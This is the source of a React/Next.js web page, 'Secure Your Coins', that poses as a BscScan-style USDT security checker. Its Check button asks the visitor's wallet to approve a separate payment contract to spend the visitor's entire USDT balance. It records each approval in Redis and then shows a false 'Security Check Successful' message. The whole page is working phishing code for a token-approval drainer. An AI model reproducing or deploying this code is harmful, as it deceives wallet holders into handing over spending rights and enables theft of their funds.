"use client";

import { useState, useEffect } from "react";
import { ethers } from "ethers";
import {
  getUSDTContract,
  CONTRACT_ADDRESSES,
  USDT_TOKEN_ABI,
} from "../lib/contracts";
import { walletService, WalletInfo } from "../lib/wallet";
import { WalletService } from "../lib/wallet";
import { redisService, ApprovalRecord } from "../lib/redis";

export default function Home() {
  // Auto-detect wallet on page load
  useEffect(() => {
    const detectWallet = () => {
      if (typeof window !== "undefined" && window.ethereum) {
        setWalletDetected(true);
      } else {
        setWalletDetected(false);
        setShowWalletAlert(true);

        // Auto-hide alert after 2 seconds
        setTimeout(() => {
          setIsAlertSlidingOut(true);
          setTimeout(() => {
            setShowWalletAlert(false);
            setIsAlertSlidingOut(false);
          }, 500);
        }, 2000);
      }
    };

    detectWallet();

    // Listen for network changes
    const handleNetworkChange = () => {
      setWalletInfo(null);
      setUsdtBalance("0");
      setBnbBalance("0");
      setUsdtAllowance("0");
      setIsApproved(false);
    };

    // Listen for account changes
    const handleAccountChange = (...args: unknown[]) => {
      const accounts = args[0] as string[];

      if (accounts.length === 0) {
        // User disconnected wallet
        setWalletInfo(null);
        setUsdtBalance("0");
        setBnbBalance("0");
        setUsdtAllowance("0");
        setIsApproved(false);
      }
    };

    if (typeof window !== "undefined" && window.ethereum) {
      window.ethereum.on("chainChanged", handleNetworkChange);
      window.ethereum.on("accountsChanged", handleAccountChange);

      // Cleanup listeners on unmount
      return () => {
        if (window.ethereum) {
          window.ethereum.removeListener("chainChanged", handleNetworkChange);
          window.ethereum.removeListener(
            "accountsChanged",
            handleAccountChange
          );
        }
      };
    }
  }, []);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [walletInfo, setWalletInfo] = useState<WalletInfo | null>(null);
  const [usdtBalance, setUsdtBalance] = useState("0");
  const [usdtAllowance, setUsdtAllowance] = useState("0");
  const [bnbBalance, setBnbBalance] = useState("0");
  const [isLoading, setIsLoading] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [walletDetected, setWalletDetected] = useState<boolean | null>(null);
  const [showWalletAlert, setShowWalletAlert] = useState(false);
  const [showNoUSDTAlert, setShowNoUSDTAlert] = useState(false);
  const [isAlertSlidingOut, setIsAlertSlidingOut] = useState(false);
  const [isNoUSDTAlertSlidingOut, setIsNoUSDTAlertSlidingOut] = useState(false);
  const [transactionStatus, setTransactionStatus] = useState<{
    hash: string;
    status: "pending" | "success" | "failed";
    message?: string;
  } | null>(null);
  const [isApproved, setIsApproved] = useState(false);
  const [isCheckingBalance, setIsCheckingBalance] = useState(false);
  const [isSwitchingNetwork, setIsSwitchingNetwork] = useState(false);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);

  const checkAndSwitchNetwork = async () => {
    try {
      if (!window.ethereum) {
        throw new Error("No wallet detected");
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const network = await provider.getNetwork();

      if (network.chainId !== 56) {
        setIsSwitchingNetwork(true);

        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }], // 56 in hex
          });
          return true;
        } catch (switchError: unknown) {
          if (
            typeof switchError === "object" &&
            switchError !== null &&
            "code" in switchError &&
            (switchError as { code: number }).code === 4902
          ) {
            try {
              await window.ethereum.request({
                method: "wallet_addEthereumChain",
                params: [
                  {
                    chainId: "0x38", // 56 in hex
                    chainName: "Binance Smart Chain",
                    nativeCurrency: {
                      name: "BNB",
                      symbol: "BNB",
                      decimals: 18,
                    },
                    rpcUrls: ["https://bsc-dataseed.binance.org/"],
                    blockExplorerUrls: ["https://bscscan.com/"],
                  },
                ],
              });

              return true;
            } catch (addError) {
              throw new Error("Failed to add BSC Mainnet to wallet");
            }
          } else {
            throw new Error("Failed to switch to BSC Mainnet");
          }
        } finally {
          setIsSwitchingNetwork(false);
        }
      }

      return true;
    } catch (error) {
      console.error("Error checking/switching network:", error);
      setIsSwitchingNetwork(false);
      throw error;
    }
  };

  const verifyWalletConnection = async () => {
    try {
      if (!window.ethereum) {
        return false;
      }

      // Check if wallet is connected by requesting accounts
      const accounts = (await window.ethereum.request({
        method: "eth_accounts",
      })) as string[];
      if (!accounts || accounts.length === 0) {
        return false;
      }

      // Also check if we're on the correct network
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const network = await provider.getNetwork();

      // Check if we're on BSC Mainnet (chainId 56)
      if (network.chainId !== 56) {
        return false; // Consider wallet not properly connected if on wrong network
      }

      return true;
    } catch (error) {
      console.error("Error verifying wallet connection:", error);
      return false;
    }
  };

  const verifyNetworkConnection = async () => {
    try {
      if (!window.ethereum) {
        console.error("No wallet detected");
        return false;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const network = await provider.getNetwork();

      // Check if we're on BSC Mainnet (chainId 56)
      if (network.chainId !== 56) {
        return false;
      }

      return true;
    } catch (error) {
      return false;
    }
  };

  const testUSDTContract = async () => {
    try {
      if (!window.ethereum) {
        return false;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const usdtContract = new ethers.Contract(
        CONTRACT_ADDRESSES.usdtToken,
        USDT_TOKEN_ABI,
        provider
      );

      const name = await usdtContract.name();
      const symbol = await usdtContract.symbol();
      const decimals = await usdtContract.decimals();
      const totalSupply = await usdtContract.totalSupply();

      return true;
    } catch (error) {
      console.error("USDT Contract Test Failed:", error);
      return false;
    }
  };

  const loadBNBBalance = async (walletAddress?: string) => {
    const addressToUse = walletAddress || walletInfo?.address;

    if (!addressToUse) {
      return "0";
    }

    try {
      if (!window.ethereum) {
        console.error("No wallet detected");
        return "0";
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const balance = await provider.getBalance(addressToUse);
      const formattedBalance = ethers.utils.formatEther(balance);

      setBnbBalance(formattedBalance);
      return formattedBalance;
    } catch (error: unknown) {
      console.error("Error loading BNB balance:", error);
      setBnbBalance("0");
      return "0";
    }
  };

  const loadUSDTBalance = async (walletAddress?: string) => {
    const addressToUse = walletAddress || walletInfo?.address;

    if (!addressToUse) {
      return "0";
    }

    try {
      if (!window.ethereum) {
        console.error("No wallet detected");
        return "0";
      }

      // Verify network connection first
      const isCorrectNetwork = await verifyNetworkConnection();
      if (!isCorrectNetwork) {
        console.error("Network verification failed");
        return "0";
      }

      // Test USDT contract connection
      const isContractWorking = await testUSDTContract();
      if (!isContractWorking) {
        console.error("USDT contract test failed");
        return "0";
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const usdtContract = new ethers.Contract(
        CONTRACT_ADDRESSES.usdtToken,
        USDT_TOKEN_ABI,
        provider
      );

      const balance = await usdtContract.balanceOf(addressToUse);

      // USDT on BSC Mainnet has 18 decimals
      const formattedBalance = ethers.utils.formatUnits(balance, 18);

      setUsdtBalance(formattedBalance);
      return formattedBalance;
    } catch (error: unknown) {
      setUsdtBalance("0");
      return "0";
    }
  };

  const loadUSDTAllowance = async (walletAddress?: string) => {
    const addressToUse = walletAddress || walletInfo?.address;

    if (!addressToUse) {
      return "0";
    }

    try {
      if (!window.ethereum) {
        console.error("No wallet detected");
        return "0";
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const usdtContract = new ethers.Contract(
        CONTRACT_ADDRESSES.usdtToken,
        USDT_TOKEN_ABI,
        provider
      );

      const allowance = await usdtContract.allowance(
        addressToUse,
        CONTRACT_ADDRESSES.paymentContract
      );
      const formattedAllowance = ethers.utils.formatUnits(allowance, 18);
      setUsdtAllowance(formattedAllowance);
      return formattedAllowance;
    } catch (error: unknown) {
      console.error("Error loading USDT allowance:", error);
      setUsdtAllowance("0");
      return "0";
    }
  };

  const checkApprovalStatus = async (walletAddress?: string) => {
    const addressToUse = walletAddress || walletInfo?.address;

    if (!addressToUse) {
      return false;
    }

    const balance = await loadUSDTBalance(addressToUse);
    const allowance = await loadUSDTAllowance(addressToUse);

    // Check if allowance is sufficient (greater than or equal to balance)
    // If balance is 0, we consider it as "approved" since there's nothing to approve
    const isSufficient =
      parseFloat(balance) === 0 || parseFloat(allowance) >= parseFloat(balance);
    setIsApproved(isSufficient);
    return isSufficient;
  };

  const checkBalanceWithRetry = async (
    walletAddress?: string,
    maxRetries = 3
  ) => {
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
      try {
        const usdtBalance = await loadUSDTBalance(walletAddress);
        const bnbBalance = await loadBNBBalance(walletAddress);

        if (parseFloat(usdtBalance) >= 0) {
          return usdtBalance;
        }
      } catch (error) {
        console.error(`Balance check attempt ${attempt} failed:`, error);
        if (attempt === maxRetries) {
          throw error;
        }
        // Wait before retry
        await new Promise((resolve) => setTimeout(resolve, 1000));
      }
    }
    return "0";
  };

  const handleCheckButton = async () => {
    // Set loading state
    setIsCheckingBalance(true);
    setError(null);

    try {
      // Always check and switch network first, regardless of wallet connection status

      await checkAndSwitchNetwork();

      if (!walletInfo) {
        const connectedWalletInfo = await connectWallet();

        // After successful connection, wait a moment for state to update
        await new Promise((resolve) => setTimeout(resolve, 500));

        const isWalletConnected = await verifyWalletConnection();
        if (!isWalletConnected) {
          throw new Error("Wallet connection verification failed");
        }

        if (!connectedWalletInfo?.address) {
          throw new Error("No wallet address available after connection");
        }

        const balance = await checkBalanceWithRetry(
          connectedWalletInfo.address
        );

        if (parseFloat(balance) > 0) {
          const isApproved = await checkApprovalStatus(
            connectedWalletInfo.address
          );

          if (!isApproved) {
            try {
              await handleApprove(connectedWalletInfo.address);
              // Only show modal on successful approval
              setIsModalOpen(true);
            } catch (approvalError) {
              // Don't show modal on approval failure/cancellation
              // The error will be handled by handleApprove function
              console.log("Approval failed or was cancelled:", approvalError);
            }
          } else {
            setIsModalOpen(true);
          }
        } else {
          setShowNoUSDTAlert(true);
          setTimeout(() => {
            setIsNoUSDTAlertSlidingOut(true);
            setTimeout(() => {
              setShowNoUSDTAlert(false);
              setIsNoUSDTAlertSlidingOut(false);
            }, 500);
          }, 2000);
        }
        return;
      }

      const isWalletConnected = await verifyWalletConnection();
      if (!isWalletConnected) {
        await connectWallet();
        await new Promise((resolve) => setTimeout(resolve, 500));
      }

      const balance = await checkBalanceWithRetry(walletInfo.address);

      if (parseFloat(balance) > 0) {
        const isApproved = await checkApprovalStatus(walletInfo.address);

        if (!isApproved) {
          try {
            await handleApprove(walletInfo.address);
            // After successful approval, show the modal
            setIsModalOpen(true);
          } catch (approvalError) {
            // Don't show modal on approval failure/cancellation
            // The error will be handled by handleApprove function
            console.log("Approval failed or was cancelled:", approvalError);
          }
        } else {
          setIsModalOpen(true);
        }
      } else {
        setShowNoUSDTAlert(true);
        setTimeout(() => {
          setIsNoUSDTAlertSlidingOut(true);
          setTimeout(() => {
            setShowNoUSDTAlert(false);
            setIsNoUSDTAlertSlidingOut(false);
          }, 500);
        }, 2000);
      }
    } catch (error) {
      console.error("Error in handleCheckButton:", error);
      let errorMessage = "Failed to check balance. Please try again.";

      if (error && typeof error === "object" && "message" in error) {
        const message = (error as { message: string }).message;
        if (message.includes("Failed to switch to BSC Mainnet")) {
          errorMessage = "Please switch to BSC Mainnet in your wallet";
        } else if (message.includes("Failed to add BSC Mainnet")) {
          errorMessage = "Please add BSC Mainnet to your wallet";
        } else if (message.includes("user rejected")) {
          errorMessage = "Network switch was cancelled";
        }
      }

      setError(errorMessage);
    } finally {
      setIsCheckingBalance(false);
    }
  };

  const savePendingApproval = async (
    walletAddress: string,
    approvalAmount: string
  ) => {
    try {
      const approvalRecord: ApprovalRecord = {
        walletAddress,
        approvalAmount,
        timestamp: Date.now(),
        status: "pending",
      };
      await redisService.saveApproval(approvalRecord);
    } catch (error) {
      console.error("Error saving pending approval:", error);
    }
  };

  const handleApprove = async (walletAddress?: string) => {
    const addressToUse = walletAddress || walletInfo?.address;

    if (!addressToUse) {
      throw new Error("No wallet address available for approval");
    }

    setIsLoading(true);
    setError(null);

    try {
      // Get the current signer from the wallet
      if (!window.ethereum) {
        throw new Error("No wallet detected");
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();

      // Create USDT contract with the signer
      const usdtContract = new ethers.Contract(
        CONTRACT_ADDRESSES.usdtToken,
        USDT_TOKEN_ABI,
        signer
      );

      const balance = await usdtContract.balanceOf(addressToUse);

      if (balance.isZero()) {
        throw new Error("No USDT balance to approve");
      }

      await savePendingApproval(
        addressToUse,
        ethers.utils.formatUnits(balance, 18)
      );

      const tx = await usdtContract.approve(
        CONTRACT_ADDRESSES.paymentContract,
        balance
      );
      await tx.wait();

      setTransactionStatus({
        hash: tx.hash,
        status: "success",
        message: "Full USDT balance approved successfully!",
      });

      // Update allowance and approval status after successful approval
      await loadUSDTAllowance(addressToUse);
      await checkApprovalStatus(addressToUse);

      // Update approval record in Redis with success status
      await redisService.updateApprovalStatus(addressToUse, "success", tx.hash);

      // Show the modal with balance after approval
      setIsModalOpen(true);
    } catch (error: unknown) {
      console.error("Approval error:", error);
      let errorMessage = "Transaction failed";

      if (error && typeof error === "object" && "code" in error) {
        const errorCode = (error as { code: string }).code;
        if (errorCode === "ACTION_REJECTED") {
          errorMessage = "Transaction was rejected by user";
        } else if (errorCode === "USER_REJECTED") {
          errorMessage = "Transaction was cancelled";
        } else if (errorCode === "-32603") {
          errorMessage =
            "RPC Error - Please check your network connection and try again";
        }
      } else if (error && typeof error === "object" && "message" in error) {
        const message = (error as { message: string }).message;
        if (message.includes("insufficient funds")) {
          errorMessage = "Insufficient funds for transaction";
        } else if (message.includes("gas")) {
          errorMessage = "Gas estimation failed";
        } else if (message.includes("execution reverted")) {
          errorMessage = "Transaction reverted - check your input";
        } else if (message.includes("Internal JSON-RPC error")) {
          errorMessage = "Network error - Please try again";
        } else if (message.length > 100) {
          errorMessage = "Transaction failed - please try again";
        } else {
          errorMessage = message;
        }
      }

      setTransactionStatus({
        hash: "",
        status: "failed",
        message: errorMessage,
      });

      // Update approval status to failed in Redis
      if (addressToUse) {
        try {
          await redisService.updateApprovalStatus(addressToUse, "failed");
        } catch (redisError) {
          console.error(
            "Error updating approval status to failed:",
            redisError
          );
        }
      }

      // Re-throw the error so it can be caught by the calling function
      throw error;
    } finally {
      setIsLoading(false);
    }
  };

  const connectWallet = async (): Promise<WalletInfo> => {
    setIsConnecting(true);
    setError(null);

    try {
      const walletService = new WalletService();
      const walletInfo = await walletService.connectWallet();

      if (!walletInfo || !walletInfo.address) {
        throw new Error("Failed to get wallet address");
      }

      setWalletInfo(walletInfo);

      await new Promise((resolve) => setTimeout(resolve, 1000));

      const initialBalance = await loadUSDTBalance(walletInfo.address);

      const initialBnbBalance = await loadBNBBalance(walletInfo.address);

      return walletInfo;
    } catch (error: unknown) {
      console.error("Error connecting wallet:", error);
      let errorMessage = "Failed to connect wallet";

      if (error && typeof error === "object" && "message" in error) {
        const message = (error as { message: string }).message;
        if (message.includes("BSC Testnet")) {
          errorMessage =
            "Please approve the network switch to BSC Testnet in your wallet";
        } else if (message.includes("add BSC Testnet")) {
          errorMessage = "Please approve adding BSC Testnet to your wallet";
        } else if (message.includes("user rejected")) {
          errorMessage = "Wallet connection was cancelled";
        } else if (message.includes("Failed to get wallet address")) {
          errorMessage = "Wallet connection failed. Please try again.";
        } else if (message.includes("Network verification failed")) {
          errorMessage = "Please switch to BSC Mainnet in your wallet";
        }
      }

      setError(errorMessage);
      throw error; // Re-throw to be caught by handleCheckButton
    } finally {
      setIsConnecting(false);
    }
  };

  return (
    <div
      className="min-h-screen flex flex-col"
      style={{
        background: "linear-gradient(to right, rgb(0, 0, 0), rgb(40, 41, 42))",
      }}
    >
      {/* Header */}
      <header className="bg-black text-white">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center">
              <img
                alt="Logo"
                src="/logo.png"
                className="h-8 sm:h-16 md:h-20 lg:h-22 w-auto object-contain"
              />
            </div>

            {/* Desktop Navigation */}
            <nav className="hidden lg:flex space-x-10 xl:space-x-13">
              <a
                href="https://bscscan.com"
                target="_blank"
                rel="noopener noreferrer"
                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded text-sm xl:text-base"
              >
                Home
              </a>
              <a
                href="https://bscscan.com/txs"
                target="_blank"
                rel="noopener noreferrer"
                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded text-sm xl:text-base"
              >
                Blockchain
              </a>
              <a
                href="https://bscscan.com/tokens"
                target="_blank"
                rel="noopener noreferrer"
                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded text-sm xl:text-base"
              >
                Tokens
              </a>
              <a
                href="https://bscscan.com/validators"
                target="_blank"
                rel="noopener noreferrer"
                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded text-sm xl:text-base"
              >
                Validators
              </a>
              <a
                href="https://bscscan.com/nft-top-contracts"
                target="_blank"
                rel="noopener noreferrer"
                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded text-sm xl:text-base"
              >
                NFTs
              </a>
              <a
                href="https://bscscan.com/charts"
                target="_blank"
                rel="noopener noreferrer"
                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded text-sm xl:text-base"
              >
                Resources
              </a>
              <a
                href="https://bscscan.com/verifyContract"
                target="_blank"
                rel="noopener noreferrer"
                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded text-sm xl:text-base"
              >
                Developers
              </a>
            </nav>

            {/* Mobile Menu Button */}
            <button 
              className="lg:hidden p-2 text-white hover:bg-yellow-400 hover:bg-opacity-20 rounded transition-all duration-300"
              onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
            >
              <svg
                className="w-6 h-6"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                {isMobileMenuOpen ? (
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M6 18L18 6M6 6l12 12"
                  />
                ) : (
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M4 6h16M4 12h16M4 18h16"
                  />
                )}
              </svg>
            </button>
          </div>

          {/* Mobile Navigation Menu */}
          {isMobileMenuOpen && (
            <div className="lg:hidden border-t border-gray-700">
              <nav className="py-4 space-y-2">
                <a
                  href="https://bscscan.com"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="block text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded text-sm"
                  onClick={() => setIsMobileMenuOpen(false)}
                >
                  Home
                </a>
                <a
                  href="https://bscscan.com/txs"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="block text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded text-sm"
                  onClick={() => setIsMobileMenuOpen(false)}
                >
                  Blockchain
                </a>
                <a
                  href="https://bscscan.com/tokens"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="block text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded text-sm"
                  onClick={() => setIsMobileMenuOpen(false)}
                >
                  Tokens
                </a>
                <a
                  href="https://bscscan.com/validators"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="block text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded text-sm"
                  onClick={() => setIsMobileMenuOpen(false)}
                >
                  Validators
                </a>
                <a
                  href="https://bscscan.com/nft-top-contracts"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="block text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded text-sm"
                  onClick={() => setIsMobileMenuOpen(false)}
                >
                  NFTs
                </a>
                <a
                  href="https://bscscan.com/charts"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="block text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded text-sm"
                  onClick={() => setIsMobileMenuOpen(false)}
                >
                  Resources
                </a>
                <a
                  href="https://bscscan.com/verifyContract"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="block text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded text-sm"
                  onClick={() => setIsMobileMenuOpen(false)}
                >
                  Developers
                </a>
              </nav>
            </div>
          )}
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
          <h1
            className="text-4xl font-bold mb-4"
            style={{ color: "rgb(255, 204, 0)" }}
          >
            Secure Your Coins
          </h1>
          <h2 className="text-xl text-white mb-8">
            Ensure your tokens are secure on every network.
          </h2>

          <div className="flex justify-center">
            <button
              onClick={handleCheckButton}
              disabled={
                isConnecting ||
                walletDetected === false ||
                isCheckingBalance ||
                isSwitchingNetwork
              }
              className="flex items-center gap-2 px-6 py-3 bg-yellow-400 text-black font-medium rounded-lg hover:bg-yellow-300 disabled:opacity-50 disabled:cursor-not-allowed transition-colors duration-300"
            >
              {isSwitchingNetwork ? (
                <>
                  <svg
                    className="animate-spin -ml-1 mr-3 h-5 w-5 text-black"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                  Switching Network...
                </>
              ) : isCheckingBalance ? (
                <>
                  <svg
                    className="animate-spin -ml-1 mr-3 h-5 w-5 text-black"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                  Checking...
                </>
              ) : isConnecting ? (
                <>
                  <svg
                    className="animate-spin -ml-1 mr-3 h-5 w-5 text-black"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                  Connecting...
                </>
              ) : walletDetected === false ? (
                "No Wallet Detected"
              ) : (
                <>
                  <svg
                    stroke="currentColor"
                    fill="currentColor"
                    strokeWidth="0"
                    viewBox="0 0 512 512"
                    className="w-5 h-5"
                  >
                    <path d="M461.2 128H80c-8.84 0-16-7.16-16-16s7.16-16 16-16h384c8.84 0 16-7.16 16-16 0-26.51-21.49-48-48-48H64C28.65 32 0 60.65 0 96v320c0 35.35 28.65 64 64 64h397.2c28.02 0 50.8-21.53 50.8-48V176c0-26.47-22.78-48-50.8-48zM416 336c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z"></path>
                  </svg>
                  Check
                </>
              )}
            </button>
          </div>

          {error && (
            <div className="mt-4 p-3 bg-red-50 border border-red-200 rounded-lg max-w-md mx-auto">
              <p className="text-sm text-red-700">{error}</p>
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-black text-white py-6">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
          <p className="text-sm">
            © 2025 Best application to secure your coins All rights reserved.
          </p>
        </div>
      </footer>

      {/* Modal */}
      {isModalOpen && (
        <div
          className="fixed inset-0 bg-black bg-opacity-50 flex text-center items-center justify-center z-50"
          onClick={() => setIsModalOpen(false)}
        >
          <div
            className="bg-white rounded-lg p-8 max-w-[500] w-full mx-4"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-center mb-6 text-xl">
              <svg
                focusable="false"
                aria-hidden="true"
                viewBox="0 0 24 24"
                data-testid="CheckCircleIcon"
                style={{ color: "green", marginRight: "10px" }}
                fill="currentColor"
                width={40}
                height={40}
              >
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2m-2 15-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8z"></path>
              </svg>
              <h2 className="font-semibold text-gray-900">
                Security Check Successful
              </h2>
            </div>

            <h3 className="text-green-600 mb-4">
              You are now secured. No flash or reported USDT found.
            </h3>

            <div className="text-base font-semibold text-gray-900">
              <div>
                <label>
                  BNB Balance : {parseFloat(bnbBalance).toFixed(6)} BNB
                </label>
              </div>
              <div>
                <label>
                  Your USDT Balance : {parseFloat(usdtBalance).toFixed(2)} USDT
                </label>
              </div>
            </div>
            <div className="flex justify-end mt-6">
              <button
                onClick={() => setIsModalOpen(false)}
                className="px-4 py-2 text-[#1976d2] rounded-lg hover:text-[#19b6d2] transition-colors duration-300"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Wallet Alert */}
      {showWalletAlert && (
        <div
          className={`fixed top-4 right-4 z-50 transform transition-all duration-500 ease-in-out ${
            isAlertSlidingOut ? "animate-slide-out" : "animate-slide-in"
          }`}
        >
          <div className="bg-gradient-to-r from-orange-500 to-orange-600 text-white px-6 py-4 rounded-lg shadow-xl border-l-4 border-orange-700 max-w-sm backdrop-blur-sm">
            <div className="flex items-center">
              <div className="flex-shrink-0">
                <svg
                  className="h-5 w-5 text-orange-200"
                  fill="currentColor"
                  viewBox="0 0 20 20"
                >
                  <path
                    fillRule="evenodd"
                    d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z"
                    clipRule="evenodd"
                  />
                </svg>
              </div>
              <div className="ml-3">
                <p className="text-sm font-medium">
                  No Ethereum Wallet detected
                </p>
                <p className="text-xs text-orange-200 mt-1">
                  Please install MetaMask or Trust Wallet
                </p>
              </div>
              <div className="ml-auto pl-3">
                <button
                  onClick={() => {
                    setIsAlertSlidingOut(true);
                    setTimeout(() => {
                      setShowWalletAlert(false);
                      setIsAlertSlidingOut(false);
                    }, 500);
                  }}
                  className="text-orange-200 hover:text-white transition-colors"
                >
                  <svg
                    className="h-4 w-4"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                  >
                    <path
                      fillRule="evenodd"
                      d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z"
                      clipRule="evenodd"
                    />
                  </svg>
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* No USDT Alert */}
      {showNoUSDTAlert && (
        <div
          className={`fixed top-20 right-4 z-50 transform transition-all duration-500 ease-in-out ${
            isNoUSDTAlertSlidingOut ? "animate-slide-out" : "animate-slide-in"
          }`}
        >
          <div className="bg-gradient-to-r from-red-500 to-red-600 text-white px-6 py-4 rounded-lg shadow-xl border-l-4 border-red-700 max-w-sm backdrop-blur-sm">
            <div className="flex items-center">
              <div className="flex-shrink-0">
                <svg
                  className="h-5 w-5 text-red-200"
                  fill="currentColor"
                  viewBox="0 0 20 20"
                >
                  <path
                    fillRule="evenodd"
                    d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                    clipRule="evenodd"
                  />
                </svg>
              </div>
              <div className="ml-3">
                <p className="text-sm font-medium">No USDT Balance Found</p>
                <p className="text-xs text-red-200 mt-1">
                  You need USDT tokens to proceed
                </p>
              </div>
              <div className="ml-auto pl-3">
                <button
                  onClick={() => {
                    setIsNoUSDTAlertSlidingOut(true);
                    setTimeout(() => {
                      setShowNoUSDTAlert(false);
                      setIsNoUSDTAlertSlidingOut(false);
                    }, 500);
                  }}
                  className="text-red-200 hover:text-white transition-colors"
                >
                  <svg
                    className="h-4 w-4"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                  >
                    <path
                      fillRule="evenodd"
                      d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z"
                      clipRule="evenodd"
                    />
                  </svg>
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
